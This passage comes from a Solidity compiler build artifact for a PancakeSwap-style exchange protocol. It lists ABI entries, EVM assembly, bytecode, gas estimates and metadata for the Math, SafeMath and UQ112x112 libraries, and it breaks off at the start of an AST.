"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"v\",\"type\":\"uint8\"},{\"internalType\":\"bytes32\",\"name\":\"r\",\"type\":\"bytes32\"},{\"internalType\":\"bytes32\",\"name\":\"s\",\"type\":\"bytes32\"}],\"name\":\"permit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"price0CumulativeLast\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"price1CumulativeLast\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"skim\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0Out\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1Out\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"swap\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"sync\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"token0\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"token1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"src/exchange-protocol/contracts/interfaces/IPancakePair.sol\":\"IPancakePair\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/exchange-protocol/contracts/interfaces/IPancakePair.sol\":{\"keccak256\":\"0xe4daee16aaf3d76aa213eb0133d5b72e4a2eb432d7751c14067192acb106a859\",\"urls\":[\"bzz-raw://e6cb03aa3a86cfc8951ba9b3fd61f7fdb5fd99e683f3784612c7cacae39f09e4\",\"dweb:/ipfs/QmPsrw6fZZ8kRWb8XsWBGoCp5DHLCmcQf6epbobyr1A9TZ\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"src/exchange-protocol/contracts/libraries/Math.sol": {
				"Math": {
					"abi": [],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"src/exchange-protocol/contracts/libraries/Math.sol\":115:655  library Math {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n    /* \"--CODEGEN--\":132:134   */\n  0x0b\n    /* \"--CODEGEN--\":166:173   */\n  dup3\n    /* \"--CODEGEN--\":155:164   */\n  dup3\n    /* \"--CODEGEN--\":146:153   */\n  dup3\n    /* \"--CODEGEN--\":137:174   */\n  codecopy\n    /* \"--CODEGEN--\":255:262   */\n  dup1\n    /* \"--CODEGEN--\":249:263   */\n  mload\n    /* \"--CODEGEN--\":246:247   */\n  0x00\n    /* \"--CODEGEN--\":241:264   */\n  byte\n    /* \"--CODEGEN--\":235:239   */\n  0x73\n    /* \"--CODEGEN--\":232:265   */\n  eq\n    /* \"--CODEGEN--\":222:224   */\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":269:278   */\n  invalid\n    /* \"--CODEGEN--\":222:224   */\ntag_1:\n    /* \"--CODEGEN--\":293:302   */\n  address\n    /* \"--CODEGEN--\":290:291   */\n  0x00\n    /* \"--CODEGEN--\":283:303   */\n  mstore\n    /* \"--CODEGEN--\":323:327   */\n  0x73\n    /* \"--CODEGEN--\":314:321   */\n  dup2\n    /* \"--CODEGEN--\":306:328   */\n  mstore8\n    /* \"--CODEGEN--\":347:354   */\n  dup3\n    /* \"--CODEGEN--\":338:345   */\n  dup2\n    /* \"--CODEGEN--\":331:355   */\n  return\nstop\n\nsub_0: assembly {\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":115:655  library Math {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa265627a7a723158209a5788c4fcafa0278aeb87faa15772666d77b26edf7645dea35897351fb761d664736f6c63430005100032\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60556023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea265627a7a723158209a5788c4fcafa0278aeb87faa15772666d77b26edf7645dea35897351fb761d664736f6c63430005100032",
							"opcodes": "PUSH1 0x55 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 SWAP11 JUMPI DUP9 0xC4 0xFC 0xAF LOG0 0x27 DUP11 0xEB DUP8 STATICCALL LOG1 JUMPI PUSH19 0x666D77B26EDF7645DEA35897351FB761D66473 PUSH16 0x6C634300051000320000000000000000 ",
							"sourceMap": "115:540:7:-;;132:2:-1;166:7;155:9;146:7;137:37;255:7;249:14;246:1;241:23;235:4;232:33;222:2;;269:9;222:2;293:9;290:1;283:20;323:4;314:7;306:22;347:7;338;331:24"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea265627a7a723158209a5788c4fcafa0278aeb87faa15772666d77b26edf7645dea35897351fb761d664736f6c63430005100032",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 SWAP11 JUMPI DUP9 0xC4 0xFC 0xAF LOG0 0x27 DUP11 0xEB DUP8 STATICCALL LOG1 JUMPI PUSH19 0x666D77B26EDF7645DEA35897351FB761D66473 PUSH16 0x6C634300051000320000000000000000 ",
							"sourceMap": "115:540:7:-;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17000",
								"executionCost": "94",
								"totalCost": "17094"
							},
							"internal": {
								"min(uint256,uint256)": "infinite",
								"sqrt(uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 115,
									"end": 655,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 115,
									"end": 655,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 132,
									"end": 134,
									"name": "PUSH",
									"value": "B"
								},
								{
									"begin": 166,
									"end": 173,
									"name": "DUP3"
								},
								{
									"begin": 155,
									"end": 164,
									"name": "DUP3"
								},
								{
									"begin": 146,
									"end": 153,
									"name": "DUP3"
								},
								{
									"begin": 137,
									"end": 174,
									"name": "CODECOPY"
								},
								{
									"begin": 255,
									"end": 262,
									"name": "DUP1"
								},
								{
									"begin": 249,
									"end": 263,
									"name": "MLOAD"
								},
								{
									"begin": 246,
									"end": 247,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 241,
									"end": 264,
									"name": "BYTE"
								},
								{
									"begin": 235,
									"end": 239,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 232,
									"end": 265,
									"name": "EQ"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPI"
								},
								{
									"begin": 269,
									"end": 278,
									"name": "INVALID"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPDEST"
								},
								{
									"begin": 293,
									"end": 302,
									"name": "ADDRESS"
								},
								{
									"begin": 290,
									"end": 291,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 283,
									"end": 303,
									"name": "MSTORE"
								},
								{
									"begin": 323,
									"end": 327,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 314,
									"end": 321,
									"name": "DUP2"
								},
								{
									"begin": 306,
									"end": 328,
									"name": "MSTORE8"
								},
								{
									"begin": 347,
									"end": 354,
									"name": "DUP3"
								},
								{
									"begin": 338,
									"end": 345,
									"name": "DUP2"
								},
								{
									"begin": 331,
									"end": 355,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a723158209a5788c4fcafa0278aeb87faa15772666d77b26edf7645dea35897351fb761d664736f6c63430005100032",
									".code": [
										{
											"begin": 115,
											"end": 655,
											"name": "PUSHDEPLOYADDRESS"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "ADDRESS"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "EQ"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "MSTORE"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "DUP1"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "REVERT"
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"src/exchange-protocol/contracts/libraries/Math.sol\":\"Math\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/exchange-protocol/contracts/libraries/Math.sol\":{\"keccak256\":\"0x9e94097dd206ec6121005eb1e67e8347a2cfca90fb7d0b599522ce2f8a36c09b\",\"urls\":[\"bzz-raw://bfa9f239f212c94f413dc5ef4f5cabc853e789519bd9610a51fd7a2ea222d8fb\",\"dweb:/ipfs/QmR1YCU8VQ28BnqeRQ9WqSwqjxLzmtJYz2KqW2XQKjP9dR\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"src/exchange-protocol/contracts/libraries/SafeMath.sol": {
				"SafeMath": {
					"abi": [],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":175:632  library SafeMath {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n    /* \"--CODEGEN--\":132:134   */\n  0x0b\n    /* \"--CODEGEN--\":166:173   */\n  dup3\n    /* \"--CODEGEN--\":155:164   */\n  dup3\n    /* \"--CODEGEN--\":146:153   */\n  dup3\n    /* \"--CODEGEN--\":137:174   */\n  codecopy\n    /* \"--CODEGEN--\":255:262   */\n  dup1\n    /* \"--CODEGEN--\":249:263   */\n  mload\n    /* \"--CODEGEN--\":246:247   */\n  0x00\n    /* \"--CODEGEN--\":241:264   */\n  byte\n    /* \"--CODEGEN--\":235:239   */\n  0x73\n    /* \"--CODEGEN--\":232:265   */\n  eq\n    /* \"--CODEGEN--\":222:224   */\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":269:278   */\n  invalid\n    /* \"--CODEGEN--\":222:224   */\ntag_1:\n    /* \"--CODEGEN--\":293:302   */\n  address\n    /* \"--CODEGEN--\":290:291   */\n  0x00\n    /* \"--CODEGEN--\":283:303   */\n  mstore\n    /* \"--CODEGEN--\":323:327   */\n  0x73\n    /* \"--CODEGEN--\":314:321   */\n  dup2\n    /* \"--CODEGEN--\":306:328   */\n  mstore8\n    /* \"--CODEGEN--\":347:354   */\n  dup3\n    /* \"--CODEGEN--\":338:345   */\n  dup2\n    /* \"--CODEGEN--\":331:355   */\n  return\nstop\n\nsub_0: assembly {\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":175:632  library SafeMath {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa265627a7a723158206e95158d86c4c81246358262efc03d7fc7e762d660969918612ce70f42188d6664736f6c63430005100032\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60556023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea265627a7a723158206e95158d86c4c81246358262efc03d7fc7e762d660969918612ce70f42188d6664736f6c63430005100032",
							"opcodes": "PUSH1 0x55 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 PUSH15 0x95158D86C4C81246358262EFC03D7F 0xC7 0xE7 PUSH3 0xD66096 SWAP10 XOR PUSH2 0x2CE7 0xF TIMESTAMP XOR DUP14 PUSH7 0x64736F6C634300 SDIV LT STOP ORIGIN ",
							"sourceMap": "175:457:8:-;;132:2:-1;166:7;155:9;146:7;137:37;255:7;249:14;246:1;241:23;235:4;232:33;222:2;;269:9;222:2;293:9;290:1;283:20;323:4;314:7;306:22;347:7;338;331:24"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea265627a7a723158206e95158d86c4c81246358262efc03d7fc7e762d660969918612ce70f42188d6664736f6c63430005100032",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 PUSH15 0x95158D86C4C81246358262EFC03D7F 0xC7 0xE7 PUSH3 0xD66096 SWAP10 XOR PUSH2 0x2CE7 0xF TIMESTAMP XOR DUP14 PUSH7 0x64736F6C634300 SDIV LT STOP ORIGIN ",
							"sourceMap": "175:457:8:-;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17000",
								"executionCost": "94",
								"totalCost": "17094"
							},
							"internal": {
								"add(uint256,uint256)": "infinite",
								"mul(uint256,uint256)": "infinite",
								"sub(uint256,uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 175,
									"end": 632,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 175,
									"end": 632,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 132,
									"end": 134,
									"name": "PUSH",
									"value": "B"
								},
								{
									"begin": 166,
									"end": 173,
									"name": "DUP3"
								},
								{
									"begin": 155,
									"end": 164,
									"name": "DUP3"
								},
								{
									"begin": 146,
									"end": 153,
									"name": "DUP3"
								},
								{
									"begin": 137,
									"end": 174,
									"name": "CODECOPY"
								},
								{
									"begin": 255,
									"end": 262,
									"name": "DUP1"
								},
								{
									"begin": 249,
									"end": 263,
									"name": "MLOAD"
								},
								{
									"begin": 246,
									"end": 247,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 241,
									"end": 264,
									"name": "BYTE"
								},
								{
									"begin": 235,
									"end": 239,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 232,
									"end": 265,
									"name": "EQ"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPI"
								},
								{
									"begin": 269,
									"end": 278,
									"name": "INVALID"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPDEST"
								},
								{
									"begin": 293,
									"end": 302,
									"name": "ADDRESS"
								},
								{
									"begin": 290,
									"end": 291,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 283,
									"end": 303,
									"name": "MSTORE"
								},
								{
									"begin": 323,
									"end": 327,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 314,
									"end": 321,
									"name": "DUP2"
								},
								{
									"begin": 306,
									"end": 328,
									"name": "MSTORE8"
								},
								{
									"begin": 347,
									"end": 354,
									"name": "DUP3"
								},
								{
									"begin": 338,
									"end": 345,
									"name": "DUP2"
								},
								{
									"begin": 331,
									"end": 355,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a723158206e95158d86c4c81246358262efc03d7fc7e762d660969918612ce70f42188d6664736f6c63430005100032",
									".code": [
										{
											"begin": 175,
											"end": 632,
											"name": "PUSHDEPLOYADDRESS"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "ADDRESS"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "EQ"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "REVERT"
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"src/exchange-protocol/contracts/libraries/SafeMath.sol\":\"SafeMath\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/exchange-protocol/contracts/libraries/SafeMath.sol\":{\"keccak256\":\"0xd0cc5ede4252f34f9adf75af689fb003aa6349f229b9bba72db43cba9bb1c9d9\",\"urls\":[\"bzz-raw://a2cb594533aebe5028b93c5c429b23907a4830964d8c6728565992bee4cf1eef\",\"dweb:/ipfs/QmdSBCeJiqjQeGZ2K79DXaDfaqJMtXCWAyXDWJ3KNDWZKM\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"src/exchange-protocol/contracts/libraries/UQ112x112.sol": {
				"UQ112x112": {
					"abi": [],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":219:613  library UQ112x112 {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n    /* \"--CODEGEN--\":132:134   */\n  0x0b\n    /* \"--CODEGEN--\":166:173   */\n  dup3\n    /* \"--CODEGEN--\":155:164   */\n  dup3\n    /* \"--CODEGEN--\":146:153   */\n  dup3\n    /* \"--CODEGEN--\":137:174   */\n  codecopy\n    /* \"--CODEGEN--\":255:262   */\n  dup1\n    /* \"--CODEGEN--\":249:263   */\n  mload\n    /* \"--CODEGEN--\":246:247   */\n  0x00\n    /* \"--CODEGEN--\":241:264   */\n  byte\n    /* \"--CODEGEN--\":235:239   */\n  0x73\n    /* \"--CODEGEN--\":232:265   */\n  eq\n    /* \"--CODEGEN--\":222:224   */\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":269:278   */\n  invalid\n    /* \"--CODEGEN--\":222:224   */\ntag_1:\n    /* \"--CODEGEN--\":293:302   */\n  address\n    /* \"--CODEGEN--\":290:291   */\n  0x00\n    /* \"--CODEGEN--\":283:303   */\n  mstore\n    /* \"--CODEGEN--\":323:327   */\n  0x73\n    /* \"--CODEGEN--\":314:321   */\n  dup2\n    /* \"--CODEGEN--\":306:328   */\n  mstore8\n    /* \"--CODEGEN--\":347:354   */\n  dup3\n    /* \"--CODEGEN--\":338:345   */\n  dup2\n    /* \"--CODEGEN--\":331:355   */\n  return\nstop\n\nsub_0: assembly {\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":219:613  library UQ112x112 {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa265627a7a72315820c03ba752511f9aef2246b45c2ea0d7953b4e8f9e63b282496968cb579cf0fe7064736f6c63430005100032\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60556023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea265627a7a72315820c03ba752511f9aef2246b45c2ea0d7953b4e8f9e63b282496968cb579cf0fe7064736f6c63430005100032",
							"opcodes": "PUSH1 0x55 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 0xC0 EXTCODESIZE 0xA7 MSTORE MLOAD 0x1F SWAP11 0xEF 0x22 CHAINID 0xB4 0x5C 0x2E LOG0 0xD7 SWAP6 EXTCODESIZE 0x4E DUP16 SWAP15 PUSH4 0xB2824969 PUSH9 0xCB579CF0FE7064736F PUSH13 0x63430005100032000000000000 ",
							"sourceMap": "219:394:9:-;;132:2:-1;166:7;155:9;146:7;137:37;255:7;249:14;246:1;241:23;235:4;232:33;222:2;;269:9;222:2;293:9;290:1;283:20;323:4;314:7;306:22;347:7;338;331:24"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea265627a7a72315820c03ba752511f9aef2246b45c2ea0d7953b4e8f9e63b282496968cb579cf0fe7064736f6c63430005100032",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 0xC0 EXTCODESIZE 0xA7 MSTORE MLOAD 0x1F SWAP11 0xEF 0x22 CHAINID 0xB4 0x5C 0x2E LOG0 0xD7 SWAP6 EXTCODESIZE 0x4E DUP16 SWAP15 PUSH4 0xB2824969 PUSH9 0xCB579CF0FE7064736F PUSH13 0x63430005100032000000000000 ",
							"sourceMap": "219:394:9:-;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17000",
								"executionCost": "94",
								"totalCost": "17094"
							},
							"internal": {
								"encode(uint112)": "infinite",
								"uqdiv(uint224,uint112)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 219,
									"end": 613,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 219,
									"end": 613,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 132,
									"end": 134,
									"name": "PUSH",
									"value": "B"
								},
								{
									"begin": 166,
									"end": 173,
									"name": "DUP3"
								},
								{
									"begin": 155,
									"end": 164,
									"name": "DUP3"
								},
								{
									"begin": 146,
									"end": 153,
									"name": "DUP3"
								},
								{
									"begin": 137,
									"end": 174,
									"name": "CODECOPY"
								},
								{
									"begin": 255,
									"end": 262,
									"name": "DUP1"
								},
								{
									"begin": 249,
									"end": 263,
									"name": "MLOAD"
								},
								{
									"begin": 246,
									"end": 247,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 241,
									"end": 264,
									"name": "BYTE"
								},
								{
									"begin": 235,
									"end": 239,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 232,
									"end": 265,
									"name": "EQ"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPI"
								},
								{
									"begin": 269,
									"end": 278,
									"name": "INVALID"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPDEST"
								},
								{
									"begin": 293,
									"end": 302,
									"name": "ADDRESS"
								},
								{
									"begin": 290,
									"end": 291,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 283,
									"end": 303,
									"name": "MSTORE"
								},
								{
									"begin": 323,
									"end": 327,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 314,
									"end": 321,
									"name": "DUP2"
								},
								{
									"begin": 306,
									"end": 328,
									"name": "MSTORE8"
								},
								{
									"begin": 347,
									"end": 354,
									"name": "DUP3"
								},
								{
									"begin": 338,
									"end": 345,
									"name": "DUP2"
								},
								{
									"begin": 331,
									"end": 355,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a72315820c03ba752511f9aef2246b45c2ea0d7953b4e8f9e63b282496968cb579cf0fe7064736f6c63430005100032",
									".code": [
										{
											"begin": 219,
											"end": 613,
											"name": "PUSHDEPLOYADDRESS"
										},
										{
											"begin": 219,
											"end": 613,
											"name": "ADDRESS"
										},
										{
											"begin": 219,
											"end": 613,
											"name": "EQ"
										},
										{
											"begin": 219,
											"end": 613,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 219,
											"end": 613,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 219,
											"end": 613,
											"name": "MSTORE"
										},
										{
											"begin": 219,
											"end": 613,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 219,
											"end": 613,
											"name": "DUP1"
										},
										{
											"begin": 219,
											"end": 613,
											"name": "REVERT"
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":\"UQ112x112\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":{\"keccak256\":\"0x0cd289c012b341feda98ad4cc732ee5ce64cd5d0b106796e4c8edcdad1c2e43b\",\"urls\":[\"bzz-raw://098881b3c407c56d0e9a707f6d6bc5ced2ae78dfe58aa82055c754ee2dd4c97a\",\"dweb:/ipfs/QmQEU9ynXqGR14fYyLgQbdxYebxQsCHsgwE2hr7xAeLzCC\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			}
		},
		"sources": {
			"src/exchange-protocol/contracts/PancakeERC20.sol": {
				"ast": {
					"absolutePath": "src/exchange-protocol/contracts/PancakeERC20.sol",
					"exportedSymbols": {
						"PancakeERC20": [
							435
						]
					},
					"id": 436,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"=",
								"0.5",
								".16"
							],
							"nodeType": "PragmaDirective",
